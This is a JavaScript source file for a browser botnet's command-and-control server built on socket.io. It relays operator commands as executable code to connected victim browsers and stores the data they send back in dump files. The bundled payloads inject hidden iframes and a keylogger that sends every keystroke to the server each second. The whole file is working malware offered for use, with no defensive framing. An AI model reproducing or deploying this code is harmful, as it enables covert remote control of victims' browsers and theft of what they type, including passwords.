const io = require('socket.io')(7305);
const cnc = require('socket.io')(7035);
const fs = require('fs');

let currentOperator = "";

let defaultFunctions = [PrintToFile, IframeIt, AddKeyLogger];

io.on('connection', function(socket) {
    console.log('Bot Connected');
    HandleBotConnect(socket);
    socket.on('disconnect', function() {
        HandleBotDisconnect(socket);
    });
    socket.on("dump", function(data2) {
        fs.writeFile('dumps/' + Date.now() + '(' + Math.random() + ').txt', data2, function(err, data) {
            if (err) {
                return console.log(err);
            }
        });
    });
    socket.on("dumpk", function(data2) {
        fs.writeFile('dumps/' + socket.id + '.txt', data2, function(err, data) {
            if (err) {
                return console.log(err);
            }
        });
    });
});

cnc.on('connection', function(socket) {
    console.log('CNC Operator connected.');
    currentOperator = socket.id;
    for (let _socket in io.sockets.connected) {
        HandleBotConnect(io.sockets.connected[_socket]);
    }
    socket.on("command", function(command, toWho) {
        SendCommand(command, toWho);
    });

});

function SendCommand(command, toWho) {
    command = InsertDefaultFunctions(command);
    if (toWho == "all" || !toWho) {
        for (let _socket in io.sockets.connected) {
            io.sockets.connected[_socket].emit('data', command);
        }
    } else {
        try {
            io.sockets.connected[toWho].emit('data', command);
        } catch (e) {
            console.log(e);
        }

    }
}

function HandleBotConnect(botSocket) {
    try {
        cnc.sockets.connected[currentOperator].emit("ConDis", "+" + botSocket.id);
    } catch (e) {
        console.log("[!] CNC Not connected yet!")
    }
}

function HandleBotDisconnect(botSocket) {
    try {
        cnc.sockets.connected[currentOperator].emit("ConDis", "-" + botSocket.id);
    } catch (e) {
        console.log("[!] CNC Not connected yet!")
    }
}

function InsertDefaultFunctions(defaultCommand) {
    let formattedCommand = "";
    for (i = 0; i < defaultFunctions.length; i++) {
        formattedCommand = formattedCommand + defaultFunctions[i];
    }
    formattedCommand = formattedCommand + defaultCommand;
    return formattedCommand;

}


// Example Functions of botnet

function PrintToFile(whatToPrint) {
    socket.emit('dump', whatToPrint);
}

function IframeIt(siteToIframe, hidden, width, height) {
    if (!hidden) hidden = 0;
    if (!width) width = "640px";
    if (!height) width = "480px";

    let ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", siteToIframe);
    ifrm.style.width = width;
    ifrm.style.height = height;
    if (hidden) ifrm.style.display = "none";
    document.body.appendChild(ifrm);

}

function AddKeyLogger() {
    let kl = document.createElement('script');
    kl.innerHTML = "function PrintToFileZ(whatToPrint){socket.emit('dumpk', whatToPrint);}let keys=''; document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;};setInterval(function(){PrintToFileZ(keys)}, 1000)"
    document.body.appendChild(kl);
}
